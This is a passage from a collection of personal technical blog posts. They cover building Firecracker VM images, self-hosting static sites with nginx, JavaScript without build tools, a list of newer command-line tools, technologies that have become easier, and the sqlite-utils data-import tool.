apt-get install -y init openssh-server\nRUN yes | unminimize\n# copy over some SSH keys and install other programs I wanted\n \n\n And here’s the basic shell script I’ve been using to create a filesystem image\nfrom the Docker container. I ran the whole thing as root, but technically you\nonly have to run  mount  as root. \n\n IMG_ID=$(docker build -q .)\nCONTAINER_ID=$(docker run -td $IMG_ID /bin/bash)\n\nMOUNTDIR=mnt\nFS=mycontainer.ext4\n\nmkdir $MOUNTDIR\nqemu-img create -f raw $FS 800M\nmkfs.ext4 $FS\nmount $FS $MOUNTDIR\ndocker cp $CONTAINER_ID:/ $MOUNTDIR\numount $MOUNTDIR\n \n\n I’m still not quite sure how much I’m going to like this approach of using\nDocker containers to create VM images – it feels a bit weird to me but it’s\nbeen working fine so far. \n\n I think most people who use Firecracker use a more lightweight init system than\nsystemd and it’s definitely not necessary to use systemd but I think I’m going\nto stick with systemd for now because I want it to feel mostly like a normal\nproduction Linux system and a lot of the production servers I’ve used have used\nsystemd. \n\n Okay, that’s all I have to say about creating images. Let’s talk a bit more\nabout configuring Firecracker. \n\n Firecracker supports either a socket interface or a configuration file \n\n You can start a Firecracker VM 2 ways: \n\n \n create a configuration file and run  firecracker --no-api --config-file vmconfig.json \n create an API socket and write instructions to the API socket (like they explain in their  getting started  instructions) \n \n\n I really liked the configuration file approach for doing some initial\nexperimentation because I found it easier to be able to see everything all in\none place. But when integrating Firecracker with my actual application in real\nlife, I found it easier to use the API. \n\n how I wrote a HTTP service that starts Firecracker VMs: use the Go SDK! \n\n I wanted to have a little HTTP service that I could call from my Ruby on Rails\nserver to start new VMs and stop them when I was done with them. \n\n Here’s what the interface looks like – you give it a root image and a kernel\nand it returns an ID and the VM’s IP address. All of the files paths are just local paths on my machine. \n\n $ http post localhost:8080/create root_image_path=/images/base.ext4 kernel_path=/images/vmlinux-5.8\nHTTP/1.1 200 OK\n{\n    \"id\": \"D248122A-1CCA-475C-856E-E3003A913F32\",\n    \"ip_address\": \"172.102.0.4\"\n}\n \n\n and then here’s what deleting a VM looks like (I might make this use the  DELETE  method later to make it more REST-y :) ) \n\n $ http post localhost:8080/delete id=D248122A-1CCA-475C-856E-E3003A913F32\nHTTP/1.1 200 OK\n \n\n At first I wasn’t sure how I was going to use the Firecracker socket API to implement this interface, but then I\ndiscovered that there’s a  Go SDK ! This made it\nway easier to generate the correct JSON, because there were a bunch of structs\nand the compiler would tell me if I made a typo in a field name. \n\n I basically wrote all of my code so far by copying and modifying code from  firectl , a Go command line\ntool. The reason I wrote my own tool insted of just using  firectl  directly was that I\nwanted to have a HTTP API that could launch and stop lots of different VMs. \n\n I found the  firectl  code and the Go SDK pretty easy to understand so I won’t\nsay too much more about it here. \n\n If you’re interested you can see  a gist with my current HTTP service for managing Firecracker VMs  which is a\nhuge mess and pretty buggy and not intended for anyone but me to use. It does start VMs successfully though which is an important first step!!! \n\n DigitalOcean supports nested virtualization \n\n Another question I had was: “ok, where am I going to run these\nFirecracker VMs in production?“. The funny thing about running a VM in the cloud is that cloud\ninstances are  already  VMs. Running a VM inside a VM is called “nested\nvirtualization” and not all cloud providers support it – for example AWS\ndoesn’t. \n\n Right now I’m using DigitalOcean and I was delighted to see that DigitalOcean\ndoes support nested virtualization even on their smallest droplets – I tried\nrunning the “hello world” Firecracker script from above and it just worked! \n\n I think GCP supports nested virtualization too but I haven’t tried it. The\nofficial Firecracker documentation suggests using a  metal  instance on AWS,\nprobably because Firecracker is made by AWS. \n\n I don’t know what the performance implications of using nested virtualization\nare yet but I guess I’ll find out! \n\n Firecracker only runs on Linux \n\n I should say that Firecracker uses KVM so it only runs on Linux. I don’t know\nif there’s a way to start VMs in a similarly fast way on a Mac, maybe there is?\nOr maybe there’s something special about KVM? I don’t understand how KVM works. \n\n some open questions \n\n A few things I still haven’t figured out: \n\n \n Right now I’m not using  jailer , another part of Firecracker that helps\nfurther isolate the Firecracker VM by adding some  seccomp-BPF  rules and\nother things. Maybe I should be!  firectl  uses  jailer  so it would be\npretty easy to copy the code that does that. \n I still don’t totally understand  why  Firecracker is fast (or\nalternatively, why qemu is slow). This  LWN\narticle  says that it’s because Firecracker\nemulates less devices than qemu does, but I don’t know exactly which devices\nare the ones that are making qemu slow to start. \n will it be slow to use nested virtualization? \n I don’t know if it’s possible to run graphical applications in Firecracker,\nit seems like it might not because it’s intended for servers, but maybe it is\npossible? \n I’m not sure how many Firecracker VMs I can run at a time on my little\n$5/month DigitalOcean droplet, I need to do some of experiments. \n \n\n links \n\n A few people gave me useful links answering some of the above questions. \n\n about why qemu is slower than Firecracker (thanks @tptacek for these): \n\n \n Optimizing QEMU boot time (PDF)  is really interesting and extremely clearly written \n some slides about qemu-lite, a version of qemu that boots faster and uses less memory \n \n\n about how Firecracker works: \n\n \n Shuveb Hussain’s great post  How AWS Firecracker works: a deep dive \nexplains how Firecracker works and demonstrates some of the concepts with a\ntiny version of Firecracker called . ( blog post on Sparkler ,  Sparkler github repo ). Really cool. \n the Firecracker authors’ paper:  Firecracker: Lightweight Virtualization for Serverless Applications  (there’s a video, slides, and a talk) \n \n\n on building Firecracker images: \n\n \n Álvaro Hernández has a  blog post with example code of how he got cloud-init to work with Firecracker . I haven’t tried it yet but it looks really helpful \n @jeromegn mentioned in the HN comments that fly.io uses the devmapper\nsnapshotter. I don’t know what that is yet but here’s the  kernel\ndocumentation on device-mapper snapshot support \n the “How AWS Firecracker works” post mentions “virtio-fs, which allows\nefficient sharing of files and directories between hosts and guest. This way,\na directory containing the guests’ file system can be on the host, much like\nhow Docker works.” the  kernel docs on virtio-fs \n \n\n software: \n\n \n ignite  lets you take a container image and run it as a Firecracker VM \n \n\n"},
{"url": "https://jvns.ca/blog/2022/01/24/hosting-my-static-sites-with-nginx/", "title": "Hosting my static sites with nginx", "content": "\n     \n\n Hello! Recently I’ve been thinking about putting my static sites on servers\nthat I run myself instead of using managed services like Netlify or GitHub\nPages. \n\n Originally I thought that running my own servers would require a lot of\nmaintenance and be a huge pain, but I was chatting with Wesley about what kind\nof maintainance  their servers  require, and\nthey convinced me that it might not be that bad. \n\n So I decided to try out moving all my static sites to a $5/month server to see\nwhat it was like. \n\n Everything in here is pretty standard but I wanted to write down what I did\nanyway because there are a surprising number of decisions and I like to see\nwhat choices other people make. \n\n the constraint: only static sites \n\n To keep things simple, I decided that this server would only run  nginx  and\nonly serve static sites. I have about 10 static sites right now, mostly projects for  wizard zines . \n\n I decided to use a $5/month DigitalOcean droplet, which should very easily be\nable to handle my existing traffic (about 3 requests per second and 100GB\nof bandwidth per month). Right now it’s using about 1% of its CPU. I picked\nDigitalOcean because it was what I’ve used before. \n\n Also all the sites were already behind a CDN so they’re still behind the same\nCDN. \n\n step 1: get a clean Git repo for each build \n\n This was the most interesting problem so let’s talk about it first! \n\n Building the static sites might seem pretty easy – each one of them already\nhas a working build script. \n\n But I have pretty bad hygiene around files on my laptop – often I have a bunch of\nuncommitted files that I don’t want to go onto the live site. So I wanted to\nstart every build with a clean Git repo. I also wanted this to be  fast  – I’m\nimpatient so I wanted to be able to build and deploy most of my sites in less than 10\nseconds. \n\n I handled this by hacking together a tiny build system called\n tinybuild . It’s\nbasically a 4-line bash script, but with extra some command line arguments and\nerror checking. Here are the 4 lines of bash: \n\n docker build - -t tinybuild < Dockerfile\nCONTAINER_ID=$(docker run -v \"$PWD\":/src -v \"./deploy:/artifact\" -d -t tinybuild /bin/bash)\ndocker exec $CONTAINER_ID bash -c \"git clone /src /build && cd /build && bash /src/scripts/build.sh\"\ndocker exec $CONTAINER_ID bash -c \"mv /build/public/* /artifact\"\n \n\n These 4 lines: \n\n \n Build a Dockerfile with all the dependencies for that build \n Clone my repo into  /build  in the container, so that I always start with a clean Git repo \n Run the build script ( /src/scripts/build.sh ) \n Copy the build artifacts into  ./deploy  in the local directory \n \n\n Then once I have  ./deploy , I can rsync the result onto the server \n\n It’s fast because: \n\n \n the  docker build -  means I don’t send any state from the repository to\nthe Docker daemon. This matters because one of my repos is 1GB (it has a lot\nof PDFs in it) and sending all that to the Docker daemon takes forever \n the  git clone  is from the local filesystem and I have a SSD so it’s fast even for a 1GB repo \n most of the build scripts just run  hugo  or  cat  so they’re fast. The  npm  build scripts take maybe 30 seconds. \n \n\n apparently local git clones make hard links \n\n A tiny interesting fact: I tried to do  git clone --depth 1  to speed up my git\nclone, but git gave me this warning: \n\n warning: --depth is ignored in local clones; use file:// instead.\n \n\n I think what’s going on here is that git makes hard links of all the objects to\nmake a local clone (which is a lot faster than copying). So I guess with the\nhard links approach  --depth 1  doesn’t make sense for some reason? And\n file://  forces git to copy all objects instead, which is actually slower. \n\n bonus: now my builds are faster than they used to be! \n\n One nice thing about this is that my build/deploy time is less than it was on\nNetlify. For  jvns.ca  it’s about 7 seconds to build and deploy the site\ninstead of about a minute previously. \n\n running the builds on my laptop seems nice \n\n I’m the only person who develops all of my sites, so doing all the builds in a\nDocker container on my computer seems to make sense. My computer is pretty fast\nand all the files are already right there! No giant downloads! And doing it in\na Docker container keeps the build isolated. \n\n example build scripts \n\n Here are the build scripts for this blog ( jvns.ca ). \n\n Dockerfile \n\n FROM ubuntu:20.04\n\nRUN apt-get update && apt-get install -y git\nRUN apt-get install -y wget python2\nRUN wget https://github.com/gohugoio/hugo/releases/download/v0.40.1/hugo_0.40.1_Linux-64bit.tar.gz\nRUN wget https://github.com/sass/dart-sass/releases/download/1.49.0/dart-sass-1.49.0-linux-x64.tar.gz\nRUN tar -xf dart-sass-1.49.0-linux-x64.tar.gz\nRUN tar -xf hugo_0.40.1_Linux-64bit.tar.gz\nRUN mv hugo /usr/bin/hugo\nRUN mv dart-sass/sass /usr/bin/sass\n \n\n build-docker.sh : \n\n set -eu\nscripts/parse_titles.py\nsass sass/:static/stylesheets/\nhugo\n \n\n deploy.sh : \n\n set -eu\ntinybuild -s scripts/build-docker.sh \\\n          -l \"$PWD/deploy\" \\\n          -c /build/public\n\nrsync-showdiff ./deploy/ root@staticsites:/var/www/jvns.ca\nrm -rf ./deploy\n \n\n step 2: get rsync to just show me which files it updated \n\n When I started using rsync to sync the files, it would list every single file\ninstead of just files that had changed. I think this was because I was\ngenerating new files for every build, so the timestamps were always newer than\nthe files on the server. \n\n I did a bunch of Googling and figured out this incantation to get rsync to just\nshow me files that were updated; \n\n rsync -avc --out-format='%n' \"$@\" | grep --line-buffered -v '/$'\n \n\n I put that in a script called  rsync-showdiff  so I could reuse it. There might\nbe a better way, but this seems to work. \n\n step 3: configuration management \n\n All I needed to do to set up the server was: \n\n \n install nginx \n create directories in /var/www for each site, like  /var/www/jvns.ca \n create an nginx configuration for each site, like  /etc/nginx/sites-enabled/jvns.ca.conf \n deploy the files (with my deploy script above) \n \n\n I wanted to use some kind of configuration management to do this because that’s how I’m\nused to managing servers. I’ve used Puppet a lot in the past at work, but I don’t\nreally  like  using Puppet. So I decided to use Ansible even though I’d never\nused it before because it seemed simpler than using Puppet. Here’s  my current Ansible configuration ,\nminus some of the templates it depends on. \n\n I didn’t use any Ansible plugins because I wanted to maximize the probability\nthat I would actually be able to run this thing in 3 years. \n\n The most complicated thing in there is probably the  reload nginx  handler,\nwhich makes sure that the configuration is still valid after I make an nginx\nconfiguration update. \n\n step 4: replace a lambda function \n\n I was using one Netlify lambda function to calculate purchasing power parity\n(“PPP”) for countries that have a weaker currency relative to the US on  https://wizardzines.com . Basically it\ngets your country using IP geolocation and then returns a discount code if\nyou’re in a country that has a discount code. (like 70% off for India, for\nexample). So I needed to replace it. \n\n I handled this by rewriting the (very small) program in Go, copying the\nstatic binary to the server, and adding a  proxy_pass  for that site. \n\n The program just looks up the country code from the  geolocation HTTP header \nin a hashmap, so it doesn’t seem like it should cause maintenance problems. \n\n a very simple nginx config \n\n I used the same nginx config file for templates for almost all my sites: \n\n server {\n\tlisten 80;\n\tlisten [::]:80;\n\n\troot /var/www/{{item.dir}};\n\tindex index.html index.htm;\n\tserver_name {{item.server}};\n\n    location / {\n        # First attempt to serve request as file, then\n        # as directory, then fall back to displaying a 404.\n        try_files $uri $uri/ =404;\n    }\n}\n \n\n The  {{item.dir}}  is an Ansible thing. \n\n I also added support for custom 404 pages ( error_page /404.html ) in the main  nginx.conf . \n\n I’ll probably add TLS support with certbot later. My CDN handles TLS to the\nclient, I just need to make the connection between the CDN and the origin\nserver use TLS \n\n Also I don’t know if there are problems with using such a simple nginx config.\nMaybe I’ll learn about them! \n\n bonus: I can find 404s more easily \n\n Another nice bonus of this setup is that it’s easier to see what’s happening\nwith my site – I can just look at the nginx logs! \n\n I ran  grep 404 /var/log/nginx/access.log  to figure out if I’d broken\nanything during the migration, and I actually ended up finding a lot of\nlinks that had been broken for many years, but that I’d just never noticed. \n\n Netlify’s analytics has a “Top resources not found” that shows you the most\ncommon 404s, but I don’t think there’s any way to see  all  404s. \n\n a small factor: costs \n\n Part of my motivation for this switch was – I was getting close to the Netlify\nfree tier’s bandwidth limit (100GB/month), and Netlify charges $20/100GB for\nadditional bandwidth. Digital Ocean charges $1/100GB for additional bandwidth\n(20x less), and my droplet comes with 1TB of bandwidth. So the bandwidth\npricing feels a lot more reasonable to me. \n\n we’ll see how it goes! \n\n All my static sites are running on my own server now. I don’t really know what\nthis will be like to maintain, we’ll see how it goes – maybe I’ll like it!\nmaybe I’ll hate it! I definitely like the faster build times and that I can\neasily look at my nginx logs. \n\n"},
{"url": "https://jvns.ca/blog/2023/02/16/writing-javascript-without-a-build-system/", "title": "Writing Javascript without a build system", "content": "\n     \n\n Hello! I’ve been writing some Javascript this week, and as always when I start\na new frontend project, I was faced with the question: should I use a build\nsystem? \n\n I want to talk about what’s appealing to me about build systems, why I\n(usually) still don’t use them, and why I find it frustrating that some\nfrontend Javascript libraries require that you use a build system. \n\n I’m writing this because most of the writing I see about JS assumes that\nyou’re using a build system, and it can be hard to navigate for folks like me\nwho write very simple small Javascript projects that don’t require a build\nsystem. \n\n what’s a build system? \n\n The idea is that you have a bunch of Javascript or Typescript code, and you\nwant to translate it into different Javascript code before you put it on your\nwebsite. \n\n Build systems can do lots of useful things, like: \n\n \n combining 100s of JS files into one big bundle (for efficiency reasons) \n translating Typescript into Javascript \n typechecking Typescript \n minification \n adding polyfills to support older browsers \n compiling JSX \n treeshaking (remove unused JS code to reduce file sizes) \n building CSS (like  tailwind  does) \n and probably lots of other important things \n \n\n Because of this, if you’re building a complex frontend project today, probably you’re using a build system like webpack, rollup, esbuild, parcel, or vite. \n\n Lots of those features are appealing to me, and I’ve used build systems in the past for some of these reasons:  Mess With DNS  uses  esbuild  to translate Typescript and combine lots of files into one big file, for example. \n\n the goal: easily make changes to old tiny websites \n\n I make a lot  of   small   simple   websites , I have approximately 0 maintenance energy for any of them, and I change them very infrequently. \n\n My goal is that if I have a site that I made 3 or 5 years ago, I’d like to be able to, in 20 minutes: \n\n \n get the source from github on a new computer \n make some changes \n put it on the internet \n \n\n But my experience with build systems (not just Javascript build systems!), is\nthat if you have a 5-year-old site, often it’s a huge pain to get the site\nbuilt again. \n\n And because most of my websites are pretty small, the  advantage  of using a\nbuild system is pretty small – I don’t really need Typescript or JSX. I can\njust have one 400-line  script.js  file and call it a day. \n\n example: trying to build the SQL playground \n\n One of my sites (the  sql playground ) uses a build system (it’s using Vue). I last edited that project 2 years ago, on a different machine. \n\n Let’s see if I can still easily build it today on my machine. To start out, we have to run  npm install . Here’s the output I get. \n\n $ npm install\n[lots of output redacted]\nnpm ERR! code 1\nnpm ERR! path /Users/bork/work/sql-playground.wizardzines.com/node_modules/grpc\nnpm ERR! command failed\nnpm ERR! command sh /var/folders/3z/g3qrs9s96mg6r4dmzryjn3mm0000gn/T/install-b52c96ad.sh\nnpm ERR! CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/surface/init.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/avl/avl.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/backoff/backoff.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/channel/channel_args.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/channel/channel_stack.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/channel/channel_stack_builder.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/channel/channel_trace.o\nnpm ERR!   CXX(target) Release/obj.target/grpc/deps/grpc/src/core/lib/channel/channelz.o\n \n\n There’s some kind of error building  grpc . No problem. I don’t\nreally need that dependency anyway, so I can just take 5 minutes to tear it out\nand rebuild. Now I can  npm install  and everything works. \n\n Now let’s try to build the project: \n\n $ npm run build\n  ?  Building for production...Error: error:0308010C:digital envelope routines::unsupported\n    at new Hash (node:internal/crypto/hash:71:19)\n    at Object.createHash (node:crypto:130:10)\n    at module.exports (/Users/bork/work/sql-playground.wizardzines.com/node_modules/webpack/lib/util/createHash.js:135:53)\n    at NormalModule._initBuildHash (/Users/bork/work/sql-playground.wizardzines.com/node_modules/webpack/lib/NormalModule.js:414:16)\n    at handleParseError (/Users/bork/work/sql-playground.wizardzines.com/node_modules/webpack/lib/NormalModule.js:467:10)\n    at /Users/bork/work/sql-playground.wizardzines.com/node_modules/webpack/lib/NormalModule.js:499:5\n    at /Users/bork/work/sql-playground.wizardzines.com/node_modules/webpack/lib/NormalModule.js:356:12\n    at /Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:373:3\n    at iterateNormalLoaders (/Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:214:10)\n    at iterateNormalLoaders (/Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:221:10)\n    at /Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:236:3\n    at runSyncOrAsync (/Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:130:11)\n    at iterateNormalLoaders (/Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:232:2)\n    at Array.<anonymous> (/Users/bork/work/sql-playground.wizardzines.com/node_modules/loader-runner/lib/LoaderRunner.js:205:4)\n    at Storage.finished (/Users/bork/work/sql-playground.wizardzines.com/node_modules/enhanced-resolve/lib/CachedInputFileSystem.js:43:16)\n    at /Users/bork/work/sql-playground.wizardzines.com/node_modules/enhanced-resolve/lib/CachedInputFileSystem.js:79:9\n \n\n This stack overflow answer  suggests running  export NODE_OPTIONS=--openssl-legacy-provider  to fix this error. \n\n That works, and finally I can  npm run build  to build the project. \n\n This isn’t really that bad (I only had to remove a dependency and pass a slightly mysterious node option!),\nbut I would rather not be derailed by those build errors. \n\n for me, a build system isn’t worth it for small projects \n\n For me, a complicated Javascript build system just doesn’t seem worth it for\nsmall 500-line projects – it means giving up being able to easily update the\nproject in the future in exchange for some pretty marginal benefits. \n\n esbuild seems a little more stable \n\n I want to give a quick shoutout to esbuild: I  learned about esbuild in 2021  and used for a project, and\nso far it does seem a more reliable way to build JS projects. \n\n I just tried to build an  esbuild  project that I last touched 8 months ago on\na new computer, and it worked. But I can’t say for sure if I’ll be able to\neasily build that project in 2 years. Maybe it will, I hope so! \n\n not using a build system is usually pretty easy \n\n Here’s what the part of  nginx playground  code that imports all the libraries looks like: \n\n <script src=\"js/vue.global.prod.js\"></script>\n<script src=\"codemirror-5.63.0/lib/codemirror.js\"></script>\n<script src=\"codemirror-5.63.0/mode/nginx/nginx.js\"></script>\n<script src=\"codemirror-5.63.0/mode/shell/shell.js\"></script>\n<script src=\"codemirror-5.63.0/mode/javascript/javascript.js\"></script>\n<link rel=\"stylesheet\" href=\"codemirror-5.63.0/lib/codemirror.css\">\n<script src=\"script.js \"></script>\n \n\n This project is also using Vue, but it just uses a  <script src  to load Vue –\nthere’s no build process for the frontend. \n\n a no-build-system template for using Vue \n\n A couple of people asked how to get started writing Javascript without a build\nsystem. Of course you can write vanilla JS if you want, but my usual framework\nis Vue 3. \n\n Here’s a tiny template I built \nfor starting a Vue 3 project with no build system. It’s just 2 files and ~30 lines of HTML/JS. \n\n some libraries require you to use a build system \n\n This build system stuff is on my mind recently because I’m using CodeMirror 5\nfor a new project this week, and I saw there was a new version, CodeMirror 6. \n\n So I thought – cool, maybe I should use CodeMirror 6 instead of CodeMirror 5.\nBut – it seems like you can’t use CodeMirror 6 without a build system (according to  the migration guide ). So I’m going to stick with CodeMirror 5. \n\n Similarly, you used to be able to just download Tailwind as a giant CSS file,\nbut  Tailwind 3  doesn’t seem to be available as a\nbig CSS file at all anymore, you need to run Javascript to build it. So I’m\ngoing to keep using Tailwind 2 for now. (I know, I know, you’re not supposed to use the big CSS file, but it’s only 300KB gzipped and I really don’t want a build step) \n\n (edit: it looks like Tailwind released a  standalone CLI  in 2021 which seems like a nice option) \n\n I’m not totally sure why some libraries don’t provide a no-build-system version\n– maybe distributing a no-build-system version would add a lot of additional\ncomplexity to the library, and the maintainer doesn’t think it’s worth it. Or\nmaybe the library’s design means that it’s not possible to distribute a\nno-build-system version for some reason. \n\n I’d love more tips for no-build-system javascript \n\n My main strategies so far are: \n\n \n search for “CDN” on a library’s website to find a standalone javascript file \n use  https://unpkg.com  to see if the library has a built version I can use \n host my own version of libraries instead of relying on a CDN that might go down \n write my own simple integrations instead of pulling in another dependency (for example I wrote my own CodeMirror component for Vue the other day) \n if I want a build system, use esbuild \n \n\n A couple of other things that look interesting but that I haven’t looked into: \n\n \n this  typescript proposal for type syntax in Javascript comments \n ES modules generally \n \n\n"},
{"url": "https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/", "title": "A list of new(ish) command line tools", "content": "\n     \n\n Hello! Today I asked  on twitter  about newer\ncommand line tools, like  ripgrep  and  fd  and  fzf  and  exa  and  bat . \n\n I got a bunch of replies with tools I hadn’t heard of, so I thought I’d make a\nlist here. A lot of people also pointed at the  modern-unix  list. \n\n replacements for standard tools \n\n \n ripgrep ,  ag ,  ack  (grep) \n exa ,  lsd  (ls) \n mosh  (ssh) \n bat  (cat) \n delta  (a pager for git) \n fd  (find) \n drill ,  dog  (dig) \n duf  (df) \n dust , ncdu (du) \n pgcli  (psql) \n btm ,  btop ,  glances ,  gtop ,  zenith  (top) \n tldr  (man, sort of) \n sd  (sed) \n difftastic  (diff) \n mtr (traceroute) \n plocate  (locate) \n xxd,  hexyl  (hexdump) \n \n\n new inventions \n\n Here are some tools that are not exactly replacements for standard tools: \n\n \n z ,  fasd ,  autojump ,  zoxide  (tools to make it easier to find files / change directories) \n broot ,  nnn ,  ranger  (file manager) \n direnv  (load environment variables depending on the current directory) \n fzf ,  peco  (“fuzzy finder”) \n croc  and  magic-wormhole  (send files from one computer to another) \n hyperfine  (benchmarking) \n httpie ,  curlie ,  xh  (for making HTTP requests) \n entr  (run arbitrary commands when files change) \n asdf  (version manager for multiple languages) \n tig ,  lazygit  (interactive interfaces for git) \n lazydocker  (interactive interface for docker) \n choose  (the basics of awk/cut) \n ctop  (top for containers) \n fuck  (autocorrect command line errors) \n tmate  (share your terminal with a friend) \n lnav ,  angle-grinder  (tools for managing logs) \n mdp ,  glow  (ways to display markdown in the terminal) \n pbcopy/pbpaste (for clipboard <> stdin/stdout) maybe aren’t “new” but were mentioned a lot. You can  use xclip  to do the same thing on Linux. \n atuin  (extremely fancy shell history) \n \n\n JSON/YAML/CSV things: \n\n \n jq  (a great JSON-wrangling tool) \n jc  (convert various tools’ output into JSON) \n jo  (create JSON objects) \n yq   (like  jq , but for YAML). there’s also  another yq \n fq  (like  jq , but for binary) \n htmlq  (like  jq , but for HTML) \n fx  (interactive json tool) \n jless  (json pager) \n xsv  (a command line tool for csv files, from burntsushi) \n visidata  (“an interactive multitool for tabular data”) \n miller  (“like awk/sed/cut/join/sort for CSV/TSV/JSON/JSON lines”) \n \n\n grep things: \n\n \n pdfgrep  (grep for PDF) \n gron  (make JSON greppable) \n ripgrep-all  (ripgrep, but also PDF, zip, ebooks, etc) \n \n\n less-new tools \n\n Here are a few of not-so-new tools folks mentioned aren’t that well known: \n\n \n pv (“pipe viewer”, gives you a progress bar for a pipe) \n vidir (from  moreutils , lets you batch rename/delete files in vim) \n sponge, ts, parallel (also from moreutils) \n \n\n some of my favourites \n\n My favourites of these that I use already are  entr ,  ripgrep ,  git-delta ,\n httpie ,  plocate , and  jq . \n\n I’m interested in trying out  direnv ,  btm ,  z ,  xsv , and  duf , but I\nthink the most exciting tool I learned about is  vidir . \n\n"},
{"url": "https://jvns.ca/blog/2022/02/20/things-that-used-to-be-hard-and-are-now-easy/", "title": "Things that used to be hard and are now easy", "content": "\n     \n\n Hello! I was talking to some friends the other day about the types of\nconference talks we enjoyed. \n\n One category we came up with was “you know this thing that used to be super\nhard? Turns out now it’s WAY EASIER and maybe you can do it now!“. \n\n So I asked on Twitter about  programming things that used to be hard and are now easy \n\n Here are some of the answers I got. Not all of them are equally “easy”, but I\nfound reading the list really fun and it gave me some ideas for things to\nlearn. Maybe it’ll give you some ideas too. \n\n \n SSL certificates, with Let’s Encrypt \n Concurrency, with async/await (in several languages) \n Centering in CSS, with flexbox/grid \n Building fast programs, with Go \n Image recognition, with  transfer learning  (someone pointed out that the joke in  this XKCD  doesn’t make sense anymore) \n Building cross-platform GUIs, with Electron \n VPNs, with Wireguard \n Running your own code inside the Linux kernel, with eBPF \n Cross-compilation (Go and Rust ship with cross-compilation support out of the box) \n Configuring cloud infrastructure, with Terraform \n Setting up a dev environment, with Docker \n Sharing memory safely with threads, with Rust \n \n\n Things that involve hosted services: \n\n \n CI/CD, with GitHub Actions/CircleCI/GitLab etc \n Making useful websites by only writing frontend code, with a variety of “serverless” backend services \n Training neural networks, with Colab \n Deploying a website to a server, with Netlify/Heroku etc \n Running a database, with hosted services like RDS \n Realtime web applications, with Firebase \n Image recognition, with hosted ML services like Teachable Machine \n \n\n Things that I haven’t done myself but that sound cool: \n\n \n Cryptography, with opinionated crypto primitives like libsodium \n Live updates to web pages pushed by the web server, with LiveView/Hotwire \n Embedded programming, with MicroPython \n Building videogames, with Roblox / Unity \n Writing code that runs on GPU in the browser (maybe with Unity?) \n Building IDE tooling with LSP (the language server protocol) \n Interactive theorem provers (not sure with what) \n NLP, with HuggingFace \n Parsing, with PEG or parser combinator libraries \n ESP microcontrollers \n Batch data processing, with Spark \n \n\n Language specific things people mentioned: \n\n \n Rust, with non-lexical lifetimes \n IE support for CSS/JS \n \n\n what else? \n\n I’d love more examples of things that have become easier over the years. \n\n"},
{"url": "https://jvns.ca/blog/2022/05/12/sqlite-utils--a-nice-way-to-import-data-into-sqlite/", "title": "sqlite-utils: a nice way to import data into SQLite for analysis", "content": "\n     \n\n Hello! This is a quick post about a nice tool I found recently called  sqlite-utils , from the  tools category . \n\n Recently I wanted to do some basic data analysis using data from my Shopify\nstore. So I figured I’d query the Shopify API and import my data into SQLite,\nand then I could make queries to get the graphs I want. \n\n But this seemed like a lot of boring work, like I’d have to write a\nschema and write a Python program. So I hunted around for a solution, and I\nfound  sqlite-utils , a tool designed to make it easy to import arbitrary data\ninto SQLite to do data analysis on the data. \n\n sqlite-utils automatically generates a schema \n\n The Shopify data has about a billion fields and I really did not want to type\nout a schema for it.  sqlite-utils  solves this problem: if I have an array of\nJSON orders, I can create a new SQLite table with that data in it like this: \n\n import sqlite_utils\n\norders = ... # (some code to get the `orders` array here)\n\ndb = sqlite_utils.Database('orders.db')\ndb['shopify_orders'].insert_all(orders)\n \n\n you can alter the schema if there are new fields (with  alter ) \n\n Next, I ran into a problem where on the 5th page of downloads, the JSON\ncontained a new field that I hadn’t seen before. \n\n Luckily,  sqlite-utils  thought of that: there’s an  alter  flag which will\nupdate the table’s schema to include the new fields.  ``` \n\n Here’s what the code for that looks like \n\n db['shopify_orders'].insert_all(orders, alter=True)\n \n\n you can deduplicate existing rows (with  upsert ) \n\n Next I ran into a problem where sometimes when doing a sync, I’d download data\nfrom the API where some of it was new and some wasn’t. \n\n So I wanted to do an “upsert” where it only created new rows if the item didn’t\nalready exist.  sqlite-utils  also thought of this, and there’s an  upsert \nmethod. \n\n For this to work you have to specify the primary key. For me that was\n pk=\"id\" . Here’s what my final code looks like: \n\n db['shopify_orders'].upsert_all(\n    orders,\n    pk=\"id\",\n    alter=True\n)\n \n\n there’s also a command line tool \n\n I’ve talked about using  sqlite-utils  as a library so far, but there’s also a\ncommand line tool which is really useful. \n\n For example, this inserts the data from a  plants.csv  into a  plants  table: \n\n sqlite-utils insert plants.db plants plants.csv --csv\n \n\n format conversions \n\n I haven’t tried this yet, but here’s a cool example from the help docs of how\nyou can do format conversions, like converting a string to a float: \n\n sqlite-utils insert plants.db plants plants.csv --csv --convert '\nreturn {\n  \"name\": row[\"name\"].upper(),\n  \"latitude\": float(row[\"latitude\"]),\n  \"longitude\": float(row[\"longitude\"]),\n}'\n \n\n This seems really useful for CSVs, where by default it’ll often interpret numeric\ndata as strings if you don’t do this conversions. \n\n metabase seems nice too \n\n Once I had all the data in SQLite, I needed a way to draw graphs with it. I\nwanted some dashboards, so I ended up using  Metabase , an open source business\nintelligence tool. I found it very straightforward and it seems like a really\neasy way to turn SQL queries into graphs. \n\n This whole setup (sqlite-utils + metabase + SQL) feels a lot easier to use than\nmy previous setup, where I had a custom Flask website that used plotly and\npandas to draw graphs. \n\n that’s all! \n\n I was really delighted by  sqlite-utils , it was super easy to use and it did\neverything I wanted. \n\n"},
